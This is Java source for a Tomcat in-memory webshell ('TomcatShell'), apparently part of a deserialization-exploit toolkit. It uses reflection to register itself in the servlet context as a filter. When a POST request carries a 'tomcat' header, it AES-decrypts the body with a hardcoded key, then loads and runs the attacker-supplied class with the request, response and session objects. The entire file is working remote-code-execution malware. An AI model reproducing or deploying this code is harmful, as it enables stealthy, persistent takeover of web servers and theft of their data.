package xyz.eki.marshalexp.memshell;

import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.Map;

public class TomcatShell implements Filter {
    public String key = "e45e329feb5d925b";
    public TomcatShell() throws Exception{
        java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
        contextField.setAccessible(true);
        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());
        applicationContext.setAttribute("litchi",this);
        System.out.println("injected");
    }
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest)servletRequest;
        HttpServletResponse resp  = (HttpServletResponse) servletResponse;
        System.out.println("working");
        if ("tomcat".equals(req.getHeader("tomcat"))) {
            try {
                if (req.getMethod().equals("POST")) {
                    req.getSession().putValue("u", this.key);
                    Cipher c = Cipher.getInstance("AES");
                    c.init(2, new SecretKeySpec(this.key.getBytes(), "AES"));
                    //Object[] objects = new Object[]{req,resp,req.getSession()};
                    Map<String,Object> objects = new HashMap<String,Object>();
                    objects.put("session",req.getSession());
                    objects.put("response",resp);
                    objects.put("request",req);
                    Method method = ClassLoader.class.getDeclaredMethod("defineClass",byte[].class,int.class,int.class);
                    method.setAccessible(true);
                    byte[] bytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(req.getReader().readLine()));
                    ((Class)method.invoke(new URLClassLoader(new URL[]{},this.getClass().getClassLoader()),bytes,0,bytes.length)).newInstance().equals(objects);
                    return;
                }
            } catch (Exception e) {
            }
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {
    }
}